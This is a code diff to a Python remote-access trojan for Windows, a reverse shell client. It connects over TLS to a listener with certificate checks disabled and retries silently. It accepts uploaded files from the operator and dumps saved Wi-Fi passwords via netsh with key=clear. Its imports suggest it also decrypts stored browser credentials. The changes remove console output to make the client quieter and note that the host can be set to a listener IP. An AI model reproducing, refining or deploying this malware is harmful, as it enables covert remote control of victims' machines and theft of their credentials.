@@ -11,7 +11,7 @@ import json
 import win32crypt
 from Crypto.Cipher import AES
 
-HOST = '127.0.0.1'
+HOST = '127.0.0.1'  # Change to listener IP if needed
 PORT = 4443
 CHECK_INTERVAL = 10  # seconds
 
@@ -36,18 +36,17 @@ def connect():
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
-
     while True:
         if is_connected():
             try:
                 sock = socket.socket()
                 s = context.wrap_socket(sock, server_hostname=HOST)
                 s.connect((HOST, PORT))
-                print("[*] Connected to server.")
                 return s
-            except Exception as e:
-                print(f"[!] Connection failed: {e}. Retrying in {CHECK_INTERVAL}s...")
-        time.sleep(CHECK_INTERVAL)
+            except Exception:
+                time.sleep(CHECK_INTERVAL)
+        else:
+            time.sleep(CHECK_INTERVAL)
 
 def handle_server(s):
     cwd = os.getcwd()
@@ -74,12 +73,11 @@ def handle_server(s):
 
             # Upload file from listener
             if cmd.lower().startswith("upload "):
-                filename = cmd[7:].strip()
+                filename = cmd[7:].strip().split("\\")[-1]
                 if not filename:
                     s.sendall(b"[!] No filename provided.\n__end__")
                     continue
                 s.sendall(b"[+] Ready to receive file\n")
-                # read file bytes from listener
                 total_data = b""
                 while True:
                     data = s.recv(4096)
@@ -87,7 +85,6 @@ def handle_server(s):
                         total_data += data.replace(b"__end__", b"")
                         break
                     total_data += data
-                # save to cwd
                 try:
                     path_on_client = os.path.join(cwd, filename)
                     with open(path_on_client, "wb") as f:
@@ -118,10 +115,12 @@ def handle_server(s):
                     profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]
                     dump = ""
                     for profile in profiles:
-                        res = subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True, text=True)
-                        for line in res.stdout.splitlines():
+                        cmd_wifi = f'netsh wlan show profile "{profile}" key=clear'
+                        result = subprocess.run(cmd_wifi, shell=True, capture_output=True, text=True)
+                        for line in result.stdout.splitlines():
                             if "Key Content" in line:
-                                dump += f"{profile}: {line.split(':')[1].strip()}\n"
+                                password = line.split(":")[1].strip()
+                                dump += f"{profile}: {password}\n"
                                 break
                         else:
                             dump += f"{profile}: [NO PASSWORD FOUND]\n"
